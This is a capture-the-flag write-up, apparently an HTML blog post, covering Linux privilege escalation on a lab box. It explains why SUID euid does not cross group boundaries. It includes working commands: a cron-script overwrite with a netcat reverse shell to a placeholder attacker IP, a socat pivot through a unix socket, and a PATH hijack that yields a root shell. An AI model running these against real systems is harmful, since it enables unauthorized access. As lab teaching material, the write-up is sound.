@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BankSmarter — euid ≠ groups | Shashank Patil</title>
+<meta name="description" content="A four-hop Linux privilege-escalation chain on Hack Smarter&#x27;s BankSmarter: SUID euid vs groups, a cron-writable script, a unix-socket PTY server, and a PATH hijack on a SUID-root daemon.">
+
+<style>
+
+body{
+background:black;
+color:#00ff9c;
+font-family:monospace;
+margin:0;
+padding:0;
+}
+
+nav{
+padding:15px;
+border-bottom:1px solid #00ff9c;
+}
+
+nav a{
+color:#00ff9c;
+margin-right:20px;
+text-decoration:none;
+}
+
+nav a:hover{
+text-decoration:underline;
+}
+
+main{
+max-width:800px;
+margin:0 auto;
+padding:40px 20px 80px 20px;
+line-height:1.75;
+font-size:15px;
+}
+
+h1{
+line-height:1.3;
+}
+
+h2{
+margin-top:55px;
+border-bottom:1px solid #00ff9c;
+padding-bottom:8px;
+}
+
+h3{
+margin-top:35px;
+}
+
+a{
+color:#00ff9c;
+}
+
+.meta{
+opacity:0.65;
+font-size:13px;
+margin-bottom:40px;
+}
+
+code{
+background:#062;
+color:#c9ffe8;
+padding:1px 5px;
+}
+
+pre{
+border:1px solid #00ff9c;
+padding:15px;
+overflow-x:auto;
+font-size:13px;
+line-height:1.5;
+}
+
+pre code{
+background:none;
+color:#00ff9c;
+padding:0;
+}
+
+blockquote{
+border-left:3px solid #00ff9c;
+margin:30px 0;
+padding:5px 0 5px 20px;
+opacity:0.9;
+}
+
+ul{
+padding-left:20px;
+}
+
+li{
+margin-bottom:8px;
+}
+
+footer{
+border-top:1px solid #00ff9c;
+margin-top:60px;
+padding-top:20px;
+font-size:13px;
+opacity:0.8;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<nav>
+<a href="../index.html">Home</a>
+<a href="../blog.html">Blog</a>
+<a href="https://github.com/b17w1z4rd">GitHub</a>
+</nav>
+
+<main>
+
+<h1>$ cat banksmarter.md</h1>
+
+<p class="meta">
+Hack Smarter &middot; Medium &middot; Linux privilege escalation
+</p>
+
+<p>
+Hack Smarter labs rotate their target IPs on redeploy, so swap any address here for whatever your instance shows. This one is a Medium Linux box, and the whole thing turns on one idea people get wrong constantly: a non-root SUID binary hands you <code>euid</code>, and <em>nothing else</em> &mdash; no capabilities, no supplementary groups. Every wall on this machine is a <em>group</em> wall, and <code>euid</code> does not open group walls.
+</p>
+
+<h2>$ the setup</h2>
+
+<p>
+We come in with a foothold as <code>layne.stanley</code> and one interesting artifact: a SUID binary at <code>/tmp/bash</code>, owned by <code>scott.weiland</code> (uid 1002).
+</p>
+
+<pre><code>id
+# uid=1001(layne.stanley) gid=1001(layne.stanley) groups=1001(layne.stanley)
+
+ls -l /tmp/bash
+# -rwsr-xr-x 1 scott.weiland scott.weiland ... /tmp/bash
+
+/tmp/bash -p
+id
+# uid=1001(layne.stanley) euid=1002(scott.weiland) groups=1001(layne.stanley)</code></pre>
+
+<p>
+So we can act as scott's uid. The obvious next target is <code>/opt/bank</code> &mdash; and this is where the box lays its trap:
+</p>
+
+<pre><code>ls -ld /opt/bank
+# drwxr-x--- root bank-team 750 /opt/bank</code></pre>
+
+<p>
+Mode <code>750</code>, owned <code>root:bank-team</code>. Read and execute go to the <strong>bank-team group</strong> &mdash; not to scott's uid. And <code>/tmp/bash -p</code> gave us euid 1002 with <code>groups=1001</code>. The door stays shut.
+</p>
+
+<h2>$ the bug</h2>
+
+<p>
+The single unstated assumption worth naming: <strong>a SUID bit owned by a non-root user elevates only the effective user ID.</strong> It does not change your group set and grants no Linux capabilities. I burned real time here trying to force scott's groups through the euid &mdash; syscall tricks via Python, <code>setpriv</code>-style manoeuvres &mdash; and none of it works, because the kernel never handed this process scott's groups in the first place. You cannot elevate into a group you were never granted.
+</p>
+
+<blockquote>
+When the barrier is a <em>group</em> barrier, you don't need the next user's uid &mdash; you need the next user's <em>session</em>, with their full group set. That reframes the entire box: at every hop, “get a real shell as the next user” beats “fake the next user's uid.”
+</blockquote>
+
+<h2>$ hop 1 — a real session as scott</h2>
+
+<p>
+scott runs a backup script from cron, and layne can write to it:
+</p>
+
+<pre><code>ls -l /home/layne.stanley/bankSmarter_backup.sh
+# -rwxrwxr-x 1 scott.weiland layne.stanley ... bankSmarter_backup.sh</code></pre>
+
+<p>
+Owned by scott, <strong>writable by layne</strong>, executed by scott on a schedule. A textbook cron hijack. Overwrite it with a reverse shell back to the Hack Smarter VPN interface:
+</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;&#x27;EOF&#x27;
+#!/bin/bash
+busybox nc &lt;TUN1_IP&gt; 4445 -e /bin/bash
+EOF</code></pre>
+
+<p>
+Catch it on the attacker box:
+</p>
+
+<pre><code>nc -lvnp 4445</code></pre>
+
+<p>
+When cron fires we land as scott &mdash; and this time it's a real login context, so the group set is complete:
+</p>
+
+<pre><code>id
+# uid=1002(scott.weiland) groups=1002,bank-team,ronnie.stone,tmuxshare,tmuxshared</code></pre>
+
+<p>
+<code>bank-team</code> is ours now. <code>/opt/bank</code> opens.
+</p>
+
+<h2>$ hop 2 — ronnie.stone via a unix socket</h2>
+
+<p>
+Inside <code>/opt/bank</code> there's a socket with a PTY server running as <code>ronnie.stone</code>:
+</p>
+
+<pre><code>ls -l /opt/bank/sockets/
+# srw-rw---- 1 ronnie.stone bank-team ... live.sock</code></pre>
+
+<p>
+<code>live.sock</code> is group-<code>bank-team</code> accessible &mdash; which we now are. A <code>pty_server.py</code> owned by ronnie is listening on it. Connect straight through with socat:
+</p>
+
+<pre><code>socat stdio unix-connect:/opt/bank/sockets/live.sock
+id
+# uid=1003(ronnie.stone) groups=1003,bankers ...</code></pre>
+
+<p>
+We've jumped to ronnie and picked up the <code>bankers</code> group.
+</p>
+
+<h2>$ hop 3 — root via PATH hijack</h2>
+
+<p>
+The final gate is a SUID-<strong>root</strong> binary restricted to the <code>bankers</code> group:
+</p>
+
+<pre><code>ls -l /usr/local/bin/bank_backupd
+# -rwsr-x--- 1 root bankers 4750 /usr/local/bin/bank_backupd</code></pre>
+
+<p>
+It invokes a helper through <code>#!/usr/bin/env python3</code> &mdash; i.e. it resolves <code>python3</code> <strong>from $PATH</strong> while running as root. That is the whole vulnerability. Plant a fake <code>python3</code> earlier in the path:
+</p>
+
+<pre><code>mkdir -p /dev/shm/x
+printf &#x27;#!/bin/bash\n/bin/bash -p\n&#x27; &gt; /dev/shm/x/python3
+chmod +x /dev/shm/x/python3
+
+PATH=/dev/shm/x:$PATH /usr/local/bin/bank_backupd
+id
+# uid=1003(ronnie.stone) euid=0(root) ...  -&gt;  bash -p  -&gt;  root</code></pre>
+
+<h2>$ flag</h2>
+
+<p>
+<code>/root/root.txt</code> on this box isn't a hash &mdash; it's a base64-encoded thank-you note from the author. Decode it and you're done:
+</p>
+
+<pre><code>cat /root/root.txt | base64 -d
+# &quot;Thanks for doing the machine...&quot;  (author&#x27;s message)</code></pre>
+
+<h2>$ gotchas</h2>
+
+<ul>
+<li><strong>Don't stage in /tmp.</strong> An earlier attempt left <code>/tmp/python3</code> owned by layne, which blocked ronnie from writing there later. <code>/dev/shm/x/</code> sidesteps ownership collisions between hops.</li>
+<li><strong>Raw socat shells have no PTY.</strong> Pasting multiple lines causes command concatenation and silent failures &mdash; submit one command at a time, or upgrade with <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>.</li>
+<li><strong>Point the callback at the right tunnel.</strong> With multiple VPNs up, make sure the reverse shell targets the Hack Smarter fabric interface, not an unrelated <code>tun</code>.</li>
+</ul>
+
+<h2>$ takeaway</h2>
+
+<p>
+Every hop here was a group boundary, and the mistake that stalls people is reaching for <code>euid</code> to cross them. <code>euid</code> crosses <em>user</em> boundaries; to cross a <em>group</em> boundary you need a genuine session that carries the group set. In a real environment this is the difference between a service account that merely runs as a user and one that has actually inherited that user's group memberships &mdash; the second is the one that pivots.
+</p>
+
+<footer>
+<p>
+CTF handle <code>b17w1z4rd</code> &middot; <a href="https://github.com/b17w1z4rd">github.com/b17w1z4rd</a>
+</p>
+<p>
+<a href="../blog.html">&larr; back to all posts</a>
+</p>
+</footer>
+
+</main>
+
+</body>
+</html>
